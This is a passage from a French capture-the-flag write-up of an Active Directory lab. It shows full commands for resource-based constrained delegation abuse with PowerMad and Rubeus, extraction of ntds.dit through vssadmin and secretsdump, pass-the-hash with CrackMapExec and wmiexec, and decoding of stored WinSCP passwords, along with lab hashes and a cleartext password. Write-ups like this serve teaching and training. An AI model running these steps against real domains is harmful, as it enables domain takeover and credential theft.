</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png, /lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png title=/lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png></p><p>L&rsquo;utilisateur <strong>SvcJoinComputerToDom</strong> possède les droits <strong>WriteProperty</strong> sur le DC. L&rsquo;une des conditions est vérifiée, il est possible de modifier l&rsquo;attribut <code>msds-allowedtoactonbehalfofotheridentity</code>.</p><h4 id=viii2b-ajout-dune-machine-au-domaine>VIII.2.b. Ajout d&rsquo;une machine au domaine</h4><p>Afin de remplir la seconde condition, il est possible d&rsquo;ajouter une machine au domaine avec des SPN mis en place par défaut. La fonction <em>New-MachineAccount</em> de <em>PowerMad</em> permet cette action :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ New-MachineAccount -MachineAccount attackersystem -Password <span class=k>$(</span>ConvertTo-SecureString <span class=s1>&#39;Summer2018!&#39;</span> -AsPlainText -Force<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Machine account attackersystem added
</span></span></code></pre></td></tr></table></div></div><p><em>Note</em> : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c&rsquo;est le <strong>MachineAccountQuota</strong>. Dans notre cas, ce n&rsquo;est pas important car nous disposons d&rsquo;un compte spécifique pour l&rsquo;ajout de machine dans le domaine.</p><h4 id=viii2c-modification-de-msds-allowedtoactonbehalfofotheridentity>VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity</h4><p>Harmj0y explique dans son article que même lui n&rsquo;a pas complètement compris la structure de <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>. Pour modifier cette structure, il a donc extrait le champ désiré et l&rsquo;a converti au format <strong>Security Descriptor Definition Language</strong> (SDDL). Ce format est utilisé pour convertir les descripteurs de sécurité en chaînes de caractère. Il est alors possible de remplacer le SID par celui du SPN contrôlé. Une fois la structure correctement modifiée, il suffit de faire la conversion inverse et de l&rsquo;enregistrer dans le champ <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$ComputerSid</span> <span class=o>=</span> Get-DomainComputer attackersystem -Properties objectsid <span class=p>|</span> Select -Expand objectsid
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$SD</span> <span class=o>=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class=s2>&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class=k>$(</span><span class=nv>$ComputerSid</span><span class=k>)</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$SDBytes</span> <span class=o>=</span> New-Object byte<span class=o>[]</span> <span class=o>(</span><span class=nv>$SD</span>.BinaryLength<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$SD</span>.GetBinaryForm<span class=o>(</span><span class=nv>$SDBytes</span>, 0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ Get-DomainComputer dc01-ww2.factory.lan <span class=p>|</span> Set-DomainObject -Set @<span class=o>{</span><span class=s1>&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class=o>=</span><span class=nv>$SDBytes</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$RawBytes</span> <span class=o>=</span> Get-DomainComputer dc01-ww2.factory.lan -Properties <span class=s1>&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class=p>|</span> <span class=k>select</span> -expand msds-allowedtoactonbehalfofotheridentity
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$Descriptor</span> <span class=o>=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class=nv>$RawBytes</span>, <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$Descriptor</span>.DiscretionaryAcl
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png, /lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png title=/lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png></p><p>La figure 27 ci-dessus démontre que tous les prérequis de l&rsquo;exploitation ont été mis en place avec succès.</p><h3 id=viii3-exploitation>VIII.3. Exploitation</h3><p>Pour rappel, l&rsquo;exploitation se fait en abusant des mécanismes <strong>S4U2Self</strong> et <strong>S4U2Proxy</strong>. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est développé par GentilKiwi - aka Benjamin Delpy -, qui est aussi le développeur de Mimikatz. Le second est développé par harmj0y. Les deux outils sont assez similaires. Harmj0y a expliqué pourquoi il a développé Rubeus dans un <a href=https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ target=_blank rel="noopener noreffer">article</a> sur son blog.</p><p><em>Note</em> : Par défaut, Rubeus n&rsquo;est pas dans CommandoVM. Cependant,Visual Studio est installé, il suffit donc de compiler le projet disponible sur le GitHub.</p><p>Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte :</p><ul><li>/user : Le SPN que nous contrôlons ;</li><li>/rc4 : Le mot de passe de ce compte au format RC4 ;</li><li>/impersonateuser : L&rsquo;utilisateur à usurper ;</li><li>/msdsspn : Le service désiré sur le serveur désiré ;</li><li>/ptt : Pass the ticket.</li></ul><p>Le seul paramètre manquant est le mot de passe de <strong>attackersystem$</strong> au format RC4. Heureusement, Rubeus nous permet de le récupérer :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ .<span class=se>\R</span>ubeus.exe <span class=nb>hash</span> /password:Summer2018! /user:attackersystem /domain:factory.lan
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>rc4_hmac : EF266C6B963C0BB683941032008AD47F
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Ayant tous les paramètres, il est temps d&rsquo;abuser de ces mécansimes&mldr; Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l&rsquo;ensemble des machines à leur état d&rsquo;origine toute les heures, causant ainsi l&rsquo;erreur suivante :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png, /lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png title=/lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png></p><p>L&rsquo;erreur <strong>KRB_AP_ERR_SKEW</strong> signifie <em>Kerberos Authentication failed due to time skew</em>. Cette erreur survient lorsque l&rsquo;horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l&rsquo;horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : <code>net time /domain /set</code>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_issue_done.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_issue_done.png, /lib/images/writeups/2019_wonkachallenge/step8_issue_done.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_issue_done.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_issue_done.png title=/lib/images/writeups/2019_wonkachallenge/step8_issue_done.png></p><p>La commande Rubeus s&rsquo;étant terminée correctement, un ticket <strong>Administrator @ factory.lan</strong> a été créé en mémoire :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png, /lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png title=/lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png></p><p>Le ticket &ldquo;administrateur de domaine&rdquo; étant désormais en mémoire, il est possible d&rsquo;accéder au disque <strong>C:</strong> du contrôleur de domaine :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png, /lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png title=/lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png></p><h3 id=viii4-acquisition-du-ntdsdit>VIII.4. Acquisition du NTDS.dit</h3><p>Ayant les droits administrateur de domaine, il est possible de se connecter au contrôleur de domaine via <strong>psexec</strong>. Cet outil fait parti des Sysinternals de Microsoft, comme <em>procdump</em> utilisé précédemment.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PsExec.exe <span class=se>\\</span>dc01-ww2.factory.lan cmd.exe
</span></span></code></pre></td></tr></table></div></div><p>Il n&rsquo;est pas possible d&rsquo;accéder au fichier <strong>ntds.dit</strong> sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d&rsquo;utiliser <strong>vssadmin</strong> pour récupérer une copie du disque <strong>C:</strong> et ainsi récupérer le <em>ntds.dit</em> dans cet instantané :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vssadmin create shadow /for<span class=o>=</span>C:
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png, /lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png title=/lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png></p><p>Enfin, pour que <em>secretsdump.py</em> puisse retrouver les hashs disponibles dans le <em>ntds.dit</em>, il est nécessaire de récupérer la base <strong>system</strong> dans la registry Windows :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reg.exe save hklm<span class=se>\s</span>ystem c:<span class=se>\w</span>indows<span class=se>\t</span>emp<span class=se>\s</span>ystem.save
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png, /lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png title=/lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png></p><p>Les UNC path permettent de copier les fichiers générés sur CommandoVM :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>DC01-WW2 via psexec<span class=o>)</span> ➜ copy <span class=se>\\</span>?<span class=se>\G</span>LOBALROOT<span class=se>\D</span>evice<span class=se>\H</span>arddiskVolumeShadowCopy2<span class=se>\W</span>indows<span class=se>\N</span>TDS<span class=se>\n</span>tds.dit C:<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ copy <span class=se>\\</span>dc01-ww2.factory.lan<span class=se>\C</span>$<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\n</span>tds.dit .
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ copy <span class=se>\\</span>dc01-ww2.factory.lan<span class=se>\C</span>$<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\s</span>ystem.save .
</span></span></code></pre></td></tr></table></div></div><h3 id=viii4-get-hashes>VIII.4. Get hashes</h3><p>L&rsquo;outil <strong>secretsdump.py</strong> est un script de la suite <em>impacket</em>. Dans le cadre de cette épreuve, cet outil va extraire les différents hash du <em>ntds.dit</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ secretsdump.py -system .<span class=se>\s</span>ystem.save -ntds .<span class=se>\n</span>tds.dit LOCAL
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png, /lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png title=/lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png></p><p>Le flag est le sha256 du hash de l&rsquo;utilisateur <strong>krbtgt</strong>. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu&rsquo;administrateur de domaine.</p><h3 id=viii5-flag>VIII.5. Flag</h3><blockquote><p>24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5</p></blockquote><hr><h3 id=resources-6>Resources</h3><ol><li><strong>Pixis</strong>, <em>BloodHound</em>, hackndo : <a href=https://beta.hackndo.com/bloodhound/ target=_blank rel="noopener noreffer">https://beta.hackndo.com/bloodhound/</a></li><li><strong>Rohan Vazarkar</strong>, <em>BloodHound 2.1: The Fix Broken Stuff Update</em>, cptjesus.com : <a href=https://blog.cptjesus.com/posts/bloodhound21 target=_blank rel="noopener noreffer">https://blog.cptjesus.com/posts/bloodhound21</a></li><li><strong>PenTestPartners</strong>, <em>Bloodhound walkthrough. A Tool for Many Tradecrafts</em>, Blog de PenTestPartners : <a href=https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/ target=_blank rel="noopener noreffer">https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/</a></li><li><strong>Pixis</strong>, <em>Resource-Based Constrained Delegation - Risques</em>, hackndo : <a href=https://beta.hackndo.com/resource-based-constrained-delegation-attack/ target=_blank rel="noopener noreffer">https://beta.hackndo.com/resource-based-constrained-delegation-attack/</a></li><li><strong>harmj0y</strong>, <em>A Case Study in Wagging the Dog: Computer Takeover</em>, Blog de harmj0y : <a href=https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/ target=_blank rel="noopener noreffer">https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/</a></li><li><strong>Elad Shamir</strong>, <em>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</em>, Blog de shenaniganslabs : <a href=https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html target=_blank rel="noopener noreffer">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li><li><strong>Microsoft</strong>, <em>Security Descriptor Definition Language</em>, Documentation Microsoft : <a href=https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language target=_blank rel="noopener noreffer">https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language</a></li><li><strong>Dirk-jan Mollema</strong>, <em>“Relaying” Kerberos - Having fun with unconstrained delegation</em>, Blog de Dirk-jan Mollema : <a href=https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ target=_blank rel="noopener noreffer">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></li><li><strong>Microsoft</strong>, <em>Kerberos Authentication failed due to time skew</em>, Documentation Microsoft : <a href=https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/ target=_blank rel="noopener noreffer">https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/</a></li><li><strong>Microsoft</strong>, <em>vssadmin</em>, Documentation Microsoft : <a href=https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin target=_blank rel="noopener noreffer">https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin</a></li><li><strong>swisskyrepo</strong>, <em>PayloadsAllTheThings</em>, GitHub : <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit target=_blank rel="noopener noreffer">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit</a></li></ol><hr><hr><h2 id=ix-step-9---not-so-hashed>IX. Step 9 - Not so hashed</h2><blockquote><p>Veruca&rsquo;s home</p></blockquote><h3 id=tldr-8>TL;DR</h3><ol><li>Il est possible de se connecter avec le hash de l&rsquo;utilisateur <strong>adminWorkstation</strong> à la dernière machine (PC01-DEV) de ce LAN ;</li><li>Remarquer que la machine utilise <strong>WinSCP</strong> ;</li><li>N&rsquo;ayant pas de master password sur WinSCP, il est possible de récupérer des informations dans les clés de registre ;</li><li>Récupérer le hash réversible de <strong>veruca</strong> dans la clé de registre : <code>HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78</code> ;</li><li>Décoder le hash et recueillir les identifiants : <code>veruca : CuiiiiYEE3r3!</code> ;</li><li>Ajouter une route vers le sous réseau contenant la machine de <em>veruca</em> ;</li><li>Se connecter à PC01-DEV en SSH.</li></ol><hr><h3 id=ix1-pass-the-hash>IX.1. Pass the hash</h3><p>Ne restant qu&rsquo;une machine dans le réseau et possédant l&rsquo;ensemble des hash des utilisateurs du domaine, nous sommes en droit de nous dire qu&rsquo;il existe un lien entre les deux. En effet, il est possible de se connecter à différents services d&rsquo;un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.</p><p>En filtrant les utilisateurs contenant &ldquo;admin&rdquo; dans le nom, le bruteforce est relativement rapide :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cat ntds_clear<span class=p>|</span>grep -i <span class=s1>&#39;admin&#39;</span> <span class=p>|</span> grep <span class=s1>&#39;:::&#39;</span> 
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
</span></span><span class=line><span class=cl>adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
</span></span><span class=line><span class=cl>adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
</span></span></code></pre></td></tr></table></div></div><p>Finalement l&rsquo;utilisateur <code>adminWorkstation</code> peut se connecter à la dernière machine :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cme smb 172.16.42.101 -u <span class=s1>&#39;adminWorkstation&#39;</span> -H <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d&#39;</span> -d <span class=s1>&#39;FACTORY&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step9_pth.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step9_pth.png, /lib/images/writeups/2019_wonkachallenge/step9_pth.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step9_pth.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step9_pth.png title=/lib/images/writeups/2019_wonkachallenge/step9_pth.png></p><h3 id=ix2-identifiant-de-veruca>IX.2. Identifiant de Veruca</h3><p>Il est possible d&rsquo;exécuter des commandes arbitraires en utilisant la technique du Pass the hash. La suite <em>impacket</em> possède <strong>wmiexec.py</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
</span></span></code></pre></td></tr></table></div></div><p>Des raccourcis intéressants sont accessibles dans les fichiers de l&rsquo;utilisateur <strong>adminWorkstation</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>PC01-DEV<span class=o>)</span> ➜ C:<span class=se>\U</span>sers<span class=se>\a</span>dminWorkstation&gt;dir /a Desktop
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is F660-81CF
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\a</span>dminWorkstation<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>07/05/2019  03:00 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>07/05/2019  03:00 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/20/2019  12:31 PM               <span class=m>282</span> desktop.ini
</span></span><span class=line><span class=cl>06/20/2019  12:32 PM             1,446 Microsoft Edge.lnk
</span></span><span class=line><span class=cl>06/22/2019  11:46 PM             1,130 WinSCP.lnk
</span></span><span class=line><span class=cl>               <span class=m>3</span> File<span class=o>(</span>s<span class=o>)</span>          2,858 bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  11,220,193,280 bytes free
</span></span></code></pre></td></tr></table></div></div><p>Il est possible de récupérer des informations dans la registry Windows s&rsquo;il n&rsquo;y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode &ldquo;à la main&rdquo; et une méthode automatisée.</p><h4 id=ix2a-méthode-1---à-la-main>IX.2.a. Méthode 1 - À la main</h4><p>Étant connecté sur la machine, il suffit de requêter la registry Windows afin d&rsquo;obtenir les informations désirées :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step9_regquery.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step9_regquery.png, /lib/images/writeups/2019_wonkachallenge/step9_regquery.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step9_regquery.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step9_regquery.png title=/lib/images/writeups/2019_wonkachallenge/step9_regquery.png></p><p>Un <a href=https://github.com/anoopengineer/winscppasswd/releases target=_blank rel="noopener noreffer">binaire</a> sur GitHub permet de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ .<span class=se>\w</span>inscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CuiiiiYEE3r3!
</span></span></code></pre></td></tr></table></div></div><h4 id=ix2b-méthode-2---automatisée>IX.2.b. Méthode 2 - Automatisée</h4><p>Pour cette méthode, c&rsquo;est <a href="https://twitter.com/lydericlefebvre?lang=fr" target=_blank rel="noopener noreffer">@lydericlefebvre</a>, organisateur du challenge, qui m&rsquo;a donné l&rsquo;astuce. Une fois que l&rsquo;épreuve ait été validée, évidemment ;)</p><p>L&rsquo;outil <em>CrackMapExec</em> possède un module <strong>invoke_sessiongopher</strong> permettant de récupérer des informations sensibles dans différents programmes tels que PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP en utilisant <em>SessionGopher</em>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cme smb 172.16.42.101 -u <span class=s1>&#39;adminWorkstation&#39;</span> -H <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d&#39;</span> -d <span class=s1>&#39;FACTORY&#39;</span> -M invoke_sessiongopher
